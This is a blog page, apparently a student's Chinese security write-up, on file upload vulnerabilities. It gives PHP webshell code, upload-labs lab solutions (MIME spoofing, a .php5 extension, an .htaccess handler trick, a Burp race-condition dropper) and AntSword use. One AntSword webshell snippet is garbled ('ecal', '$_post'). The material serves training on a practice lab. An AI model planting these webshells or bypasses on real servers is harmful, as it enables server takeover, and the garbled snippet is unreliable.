@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Tangxianshen" />
+
+
+
+<meta name="description" content="文件上传漏洞介绍 文件上传漏洞是发生在有上传功能的应用中,如果应用程序对用户的上传文件没有控制或者存在缺陷,攻击者可以利用应用上传功能存在的缺陷，上传木马病毒等有危害的文件到服务器上面，控制服务器。 文件上传漏洞产生的主要原因是:应用中存在上传功能,但是上传的文件没有经过严格的合法性检验或者检验函数存在缺陷，导致可以上传木马文件到服务器。文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用">
+<meta property="og:url" content="http://example.com/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文件上传漏洞介绍 文件上传漏洞是发生在有上传功能的应用中,如果应用程序对用户的上传文件没有控制或者存在缺陷,攻击者可以利用应用上传功能存在的缺陷，上传木马病毒等有危害的文件到服务器上面，控制服务器。 文件上传漏洞产生的主要原因是:应用中存在上传功能,但是上传的文件没有经过严格的合法性检验或者检验函数存在缺陷，导致可以上传木马文件到服务器。文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704894978322-9705649c-8e54-4437-8c41-6cb7d714db3b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802551645-625f68f1-e047-45f8-a008-3ffa16aa89a3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802715762-dd33b9a1-b878-414a-ac04-40871d625839.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802817976-fcbb7a14-a01a-46aa-8069-26519f7a1a86.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704804002540-11217491-42e3-4de3-8515-5d260452e39f.png#averageHue=%23d69e55&clientId=u4c785162-43a8-4&from=paste&height=360&id=uc02ca140&originHeight=360&originWidth=1714&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96505&status=done&style=none&taskId=u4b4a561b-06db-45ea-86a4-a6fa7f0b36e&title=&width=1714">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704803230670-66a5787f-bb88-4c39-b4ec-f0b48be2a989.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704804217050-eb4f51d3-07c1-426c-a4cf-c42d1ed902c8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704803812463-2e4ab493-3285-4d85-8deb-e712e5acc30f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704804713798-251c60c2-dbe0-4796-b666-f7a51d865dba.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704805201249-c6b22a0d-ae62-4083-9bb7-6e9151f45fe4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704805779045-dc34595b-479d-48ef-95cb-797dbe16b62d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704806934936-ab5b98d9-105e-47c5-86f0-df5259364d06.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704885215637-32298a38-9f49-442b-bceb-0c581cad93c6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704890271835-cb54bc7f-29b2-4f93-9083-d9e3778b9fd7.png#averageHue=%23f9f4f2&clientId=ueb46ed70-4956-4&from=paste&height=52&id=ub32eb19a&originHeight=52&originWidth=508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3697&status=done&style=none&taskId=u8afd7538-8c62-42a6-9511-06efb0aa001&title=&width=508">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704890537868-413dcfb1-96a2-4a5a-8115-841752bdd3a6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704890994769-8184db52-bc90-462f-a016-38c4ef8faf6d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704892509666-e4b34028-bd3c-4653-bc7a-3b18d903bb90.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704893002140-aaab2029-bcd0-43dc-8194-415a988a9db9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704892977762-06fa7e0c-68d6-4461-b355-5cea029f1f51.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704893925898-a8bd3d04-f015-4414-815d-0c3b546fc5cb.png">
+<meta property="article:published_time" content="2024-01-13T14:50:56.000Z">
+<meta property="article:modified_time" content="2024-01-13T14:56:06.727Z">
+<meta property="article:author" content="Tangxianshen">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704894978322-9705649c-8e54-4437-8c41-6cb7d714db3b.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用 | Hexo</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/R-C.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/R-C.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
+      <time datetime="2024-01-13T14:50:56.000Z" itemprop="datePublished">2024-01-13</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p> 文件上传漏洞是发生在有上传功能的应用中,如果应用程序对用户的上传文件没有控制或者存在缺陷,攻击者可以利用应用上传功能存在的缺陷，上传木马病毒等有危害的文件到服务器上面，控制服务器。<br> 文件上传漏洞产生的主要原因是:应用中存在上传功能,但是上传的文件没有经过严格的合法性检验或者检验函数存在缺陷，导致可以上传木马文件到服务器。文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能会造成服务器的网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果。  </p>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704894978322-9705649c-8e54-4437-8c41-6cb7d714db3b.png" alt="ea2ba82593a538bf915fcb8f6cba4b9.png"></p>
+<h2 id="webshell的编写"><a href="#webshell的编写" class="headerlink" title="webshell的编写"></a>webshell的编写</h2><h3 id="webshell的含义"><a href="#webshell的含义" class="headerlink" title="webshell的含义"></a>webshell的含义</h3><p>webshell通常被称为匿名用户（入侵者）通过网站端口对网站服务器的某种程度上操作的权限。它大多以动态脚本的形式存在，因此也有人称之为网站的后门工具。</p>
+<h3 id="webshell的编写-1"><a href="#webshell的编写-1" class="headerlink" title="webshell的编写"></a>webshell的编写</h3><pre><code> 在vscode创建一个.php文件，编写木马程序。下面是一个简单的木马
+</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码接受一个名为a的GET参数，并使用@system函数执行该参数指定的命令。</p>
+<h2 id="upload-labs靶场闯关"><a href="#upload-labs靶场闯关" class="headerlink" title="upload-labs靶场闯关"></a>upload-labs靶场闯关</h2><h3 id="upload-labs靶场的介绍"><a href="#upload-labs靶场的介绍" class="headerlink" title="upload-labs靶场的介绍"></a>upload-labs靶场的介绍</h3><p>介绍：一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种 上传漏洞 的靶场。</p>
+<h3 id="第1关"><a href="#第1关" class="headerlink" title="第1关"></a>第1关</h3><p>1.下载upload-labs-master压缩包，将其解压到小皮的根目录下。<br>2.开启小皮的apache,关闭小皮的mysql<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802551645-625f68f1-e047-45f8-a008-3ffa16aa89a3.png" alt="image.png"><br>3.在主机vscode中编写木马程序命名为1.php，把1.php复制到虚拟机的桌面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>4.在小皮，打开网站，进入第一关，F12关掉js,然后上传1.php<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802715762-dd33b9a1-b878-414a-ac04-40871d625839.png" alt="image.png"><br>4.右键复制图片链接到另一个网页，在网址后面加上?a&#x3D;whoami  或<br>?a&#x3D;systeminfo  成功截图如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704802817976-fcbb7a14-a01a-46aa-8069-26519f7a1a86.png" alt="Image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704804002540-11217491-42e3-4de3-8515-5d260452e39f.png#averageHue=%23d69e55&clientId=u4c785162-43a8-4&from=paste&height=360&id=uc02ca140&originHeight=360&originWidth=1714&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96505&status=done&style=none&taskId=u4b4a561b-06db-45ea-86a4-a6fa7f0b36e&title=&width=1714" alt="Image.png"></p>
+<h3 id="第2关"><a href="#第2关" class="headerlink" title="第2关"></a>第2关</h3><p>1.查看代码，发现上传的文件必须是jpeg，png，gif类型<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704803230670-66a5787f-bb88-4c39-b4ec-f0b48be2a989.png" alt="image.png"><br>2.上传1.php后，用Yakit抓包，改为手动劫持，把16行改为image&#x2F;jpeg，在点击自动放行。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704804217050-eb4f51d3-07c1-426c-a4cf-c42d1ed902c8.png" alt="image.png"><br>3.右键复制图片链接到另一个网页，在网址后面加上?a&#x3D;whoami  或<br>?a&#x3D;systeminfo<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704803812463-2e4ab493-3285-4d85-8deb-e712e5acc30f.png" alt="image.png"></p>
+<h3 id="第3关"><a href="#第3关" class="headerlink" title="第3关"></a>第3关</h3><p>1.查看代码，发现后缀 .asp .aspx  .php .jsp 全被禁了<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704804713798-251c60c2-dbe0-4796-b666-f7a51d865dba.png" alt="image.png"><br>2.把木马1.php重命名为1.php5，在虚拟机浏览器访问192.168.2.197。<br>3.之后的步骤和第一关一样。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704805201249-c6b22a0d-ae62-4083-9bb7-6e9151f45fe4.png" alt="Image.png"></p>
+<h3 id="第4关"><a href="#第4关" class="headerlink" title="第4关"></a>第4关</h3><p>1.在vscode创建并编写 .htaccess文件,.htaccess文件是Apache服务器的一个配置文件，它允许网站管理员在服务器配置文件（通常是httpd.conf）之外，为特定目录及其子目录设置独立的配置指令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;3.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php                    <span class="comment">//这个指令为匹配模式的文件设置处理器为PHP引擎。换句话说，它告诉Apache将名为“3.jpg”的文件作为PHP脚本处理，而不是静态图像文件。</span></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>2.把  .htaccess 移到虚拟机桌面<br>3.再把木马重命名为3.jpg<br>4.先上传.htaccess文件，再上传3.jpg<br>5.右键复制图片链接到另一个网页，在网址后面加上?a&#x3D;dir  成功截图如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704805779045-dc34595b-479d-48ef-95cb-797dbe16b62d.png" alt="Image.png"></p>
+<h3 id="第18关"><a href="#第18关" class="headerlink" title="第18关"></a>第18关</h3><p>1.查看代码，第18行服务器删除当前目录文件。原理是这样的：服务器删文件。<br>向服务器不断发送上传木马请求的包，不断发送访问木马的包，服务器删不过来，个别木马被上传。若服务器性能好，则木马不能上传成功。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704806934936-ab5b98d9-105e-47c5-86f0-df5259364d06.png" alt="image.png"><br>2.重新编写木马程序</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;../p.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @system($_GET[a]); ?&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3.先上传一张正常的图片10.jpg，右键复制图像链接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704885215637-32298a38-9f49-442b-bceb-0c581cad93c6.png" alt="image.png"><br>4.打开Burp,把复制的图像链接后面的2024011xxxx.jpg改为2.php,然后粘贴到Burp的内置浏览器，再抓包<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40675946/1704890271835-cb54bc7f-29b2-4f93-9083-d9e3778b9fd7.png#averageHue=%23f9f4f2&clientId=ueb46ed70-4956-4&from=paste&height=52&id=ub32eb19a&originHeight=52&originWidth=508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3697&status=done&style=none&taskId=u8afd7538-8c62-42a6-9511-06efb0aa001&title=&width=508" alt="image.png"><br>5.把抓到的包发送到intruder,得到访问木马的包。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704890537868-413dcfb1-96a2-4a5a-8115-841752bdd3a6.png" alt="image.png"><br>6.接下来，去抓上传木马的包，选择2.php，点击下图箭头处的上传，把抓到的上传木马的包发送到intruder<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704890994769-8184db52-bc90-462f-a016-38c4ef8faf6d.png" alt="image.png"></p>
+<pre><code>  7.  3和4都改成无限发包，3是上传，4是访问。
+      ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704891390603-d307cab2-7d08-4aa6-9430-2678af922b0f.png)
+8.  3和4的线程都改成50
+    ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704891573291-56a2dfc0-500d-40fe-b6fc-bebf4988967f.png)         
+    9.点击Burp的开始攻击。结果如下
+    ![Image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704981839385-21f5a2ff-1095-4412-93b6-dc5715616b2d.png)
+    10.复制Request中的选中的部分，粘贴到upload/的后面并访问。
+    ![Image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704981891067-8a5b9687-887f-4f1a-826a-337cfbc4a084.png)
+</code></pre>
+<h2 id="蚁剑工具的使用"><a href="#蚁剑工具的使用" class="headerlink" title="蚁剑工具的使用"></a>蚁剑工具的使用</h2><h3 id="蚁剑工具的介绍"><a href="#蚁剑工具的介绍" class="headerlink" title="蚁剑工具的介绍"></a>蚁剑工具的介绍</h3><p>蚁剑（AntSword）是一款被设计用于网络攻击的远程控制工具，它能够使得攻击者获取受害计算机的远程控制权限。蚁剑通过在受害者计算机上植入恶意软件，创建一个“后门”，使攻击者可以未经授权地访问受害者系统，进行数据窃取、监控、操纵等一系列非法操作。</p>
+<h3 id="蚁剑工具的使用-1"><a href="#蚁剑工具的使用-1" class="headerlink" title="蚁剑工具的使用"></a>蚁剑工具的使用</h3><p>1.重新编写木马2.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  @<span class="title function_ invoke__">ecal</span>(<span class="variable">$_post</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.kali自带蚁剑工具，双击AntSword<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704892509666-e4b34028-bd3c-4653-bc7a-3b18d903bb90.png" alt="image.png"><br>3.右击空白处，添加数据。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704893002140-aaab2029-bcd0-43dc-8194-415a988a9db9.png" alt="image.png"><br>4.按下图填写URL地址和连接密码。点击测试链接。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704892977762-06fa7e0c-68d6-4461-b355-5cea029f1f51.png" alt="image.png"><br>5.连接靶机成功，可以对靶机上的文件进行操作。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704893925898-a8bd3d04-f015-4414-815d-0c3b546fc5cb.png" alt="image.png"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
+        <p><span>Created:</span>2024-01-13, 22:50:56</p>
+        <p><span>Updated:</span>2024-01-13, 22:56:06</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" title="文件上传漏洞的介绍，webshell编写，upload-labs靶场闯关，蚁剑工具的使用">http://example.com/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</a>
+            <span class="copy-path" data-clipboard-text="From http://example.com/2024/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%8B%E7%BB%8D%EF%BC%8Cwebshell%E7%BC%96%E5%86%99%EF%BC%8Cupload-labs%E9%9D%B6%E5%9C%BA%E9%97%AF%E5%85%B3%EF%BC%8C%E8%9A%81%E5%89%91%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2024/01/13/%E6%94%BB%E7%A0%B4%E9%9D%B6%E6%9C%BA3%EF%BC%8Cxpcmd_shell%E6%8F%90%E6%9D%83/">
+                    攻破靶机3，xpcmd_shell提权
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2024/01/08/CDN%E4%BB%8B%E7%BB%8D%E5%8F%8A%E7%BB%95%E8%BF%87,%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">
+                    CDN介绍及绕过,支付逻辑漏洞
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.</span> <span class="toc-text">目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E7%9A%84%E7%BC%96%E5%86%99"><span class="toc-number">2.</span> <span class="toc-text">webshell的编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E7%9A%84%E5%90%AB%E4%B9%89"><span class="toc-number">2.1.</span> <span class="toc-text">webshell的含义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 